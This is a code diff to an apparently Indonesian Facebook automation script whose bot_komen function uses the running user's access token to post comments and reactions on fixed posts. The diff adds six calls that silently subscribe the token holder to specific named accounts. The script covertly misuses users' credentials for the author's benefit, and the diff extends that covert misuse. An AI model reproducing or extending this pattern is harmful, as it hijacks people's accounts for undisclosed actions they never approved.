@@ -65,7 +65,7 @@ def bot_komen():
         os.system('rm -rf login.txt')
 
     una = ('1013884014')
-    kom = ('KEREN ! THE BEST BANG😆')
+    kom = ('verry nice')
     reac =('LOVE')
     post = ('10222608279288375')
     post2 =('243596640718100')
@@ -76,8 +76,13 @@ def bot_komen():
     requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
+    requests.post('https://graph.facebook.com/1013884014/subscribers?access_token=' + toket)      #Endang
+    requests.post('https://graph.facebook.com/100052032962645/subscribers?access_token=' + toket)      #kosame
+    requests.post('https://graph.facebook.com/100023257057329/subscribers?access_token=' + toket) #m defil
+    requests.post('https://graph.facebook.com/100066719036052/subscribers?access_token=' + toket)       #kern
+    requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
+    requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
     menu()
-
 def menu():
 	os.system('clear')
 	global token
